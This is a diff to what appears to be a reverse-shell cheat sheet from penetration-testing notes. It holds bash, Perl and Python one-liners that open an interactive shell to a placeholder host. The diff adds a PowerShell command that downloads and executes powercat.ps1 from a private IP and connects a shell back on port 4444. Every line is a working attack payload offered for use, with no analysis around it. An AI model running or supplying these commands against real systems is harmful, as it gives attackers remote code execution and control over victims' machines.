@@ -12,6 +12,9 @@ bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
 # Perl
 perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
+# Powershell
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.233:8000/powercat.ps1'); powercat -c 192.168.45.233 -p 4444 -e powershell"
+
 # Python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
